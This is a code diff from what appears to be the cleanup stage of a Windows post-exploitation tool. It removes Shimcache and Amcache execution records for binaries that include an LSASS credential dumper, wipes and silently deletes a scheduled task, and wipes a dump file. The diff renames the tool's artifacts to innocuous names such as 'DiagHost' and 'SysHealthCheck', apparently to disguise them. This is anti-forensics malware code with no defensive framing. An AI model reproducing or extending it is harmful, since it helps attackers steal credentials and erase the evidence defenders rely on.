@@ -221,12 +221,12 @@ int main(int argc, char* argv[]) {
     const wchar_t* shimNames[] = { BIN_BUSINESSANALYZER_W, BIN_LSASS_DUMPER_W, BIN_SELF_W };
     RemoveShimcacheEntries(shimNames, 3);
 
-    const char* amcacheNames[] = { "BusinessAnalyzer", "LsassSilentProcessExit", "Cleanerup" };
+    const char* amcacheNames[] = { "SysAnalyzer", "DiagHost", "WinOptimize" };
     RemoveAmcacheEntries(amcacheNames, 3);
 
     // Wipe task file before schtasks delete (schtasks /delete only removes, doesn't zero)
     SecureWipeFile(TASK_FILE);
-    system("schtasks /delete /tn \"mindFlush\" /f >nul 2>&1");
+    system("schtasks /delete /tn \"SysHealthCheck\" /f >nul 2>&1");
 
     // Wipe dump file
     std::ifstream tempoFile(TEMPO_FILE);
